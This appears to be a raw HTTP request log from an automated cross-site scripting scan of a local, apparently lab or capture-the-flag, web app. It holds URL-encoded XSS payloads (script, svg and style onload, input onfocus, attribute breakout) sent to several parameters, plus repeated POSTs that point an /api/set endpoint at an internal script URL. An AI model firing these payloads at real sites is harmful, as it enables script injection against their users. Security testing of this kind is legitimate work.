+2026-10-30 15:51:02,874 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,890 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,906 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,922 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,938 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,953 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:02,969 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,014 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,040 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,065 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,086 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,127 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,198 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,218 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,238 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,257 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,278 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/page "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,303 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,322 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,342 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,366 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/page?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,385 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,405 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,424 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,446 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,467 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,486 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,507 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,522 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,539 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,555 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,569 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,585 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,601 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,618 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,639 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,658 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,685 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,722 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,769 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,791 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,821 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,845 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,873 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,903 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,927 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,955 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:03,985 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,021 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,062 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,088 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,113 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,142 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,168 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,194 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,221 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,245 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,271 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,298 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,322 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,346 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,370 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,393 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,416 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,439 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/challenge "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,465 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,488 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,513 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,541 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/challenge?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 404 Not Found"
+2026-10-30 15:51:04,562 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,578 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,594 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,656 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,676 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,691 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,706 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,724 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cinput+autofocus+onfocus%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,739 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,754 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,769 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,820 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:04,889 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,912 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,937 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,966 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%22+autofocus+onfocus%3Dalert%281%29+x%3D%22 "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:04,990 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,022 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,047 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,075 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,106 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,134 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,173 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,200 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,222 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,241 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,263 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,282 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,303 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,318 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,332 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,347 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,362 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,377 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,396 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,416 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,431 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,446 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,461 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,479 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Cstyle%2Fonload%3Dalert%28%22XSS%22%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,494 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,509 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,525 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,546 - httpx - INFO - HTTP Request: POST http://host.docker.internal:51481/api/set?url=http://flask_api:8081/script "HTTP/1.1 200 OK"
+2026-10-30 15:51:05,561 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?name=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,576 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?solution=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,591 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?q=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
+2026-10-30 15:51:05,619 - httpx - INFO - HTTP Request: GET http://host.docker.internal:51481/api/set?search=%3Csvg%2Fonload%3Dalert%281%29%3E "HTTP/1.1 400 Bad Request"
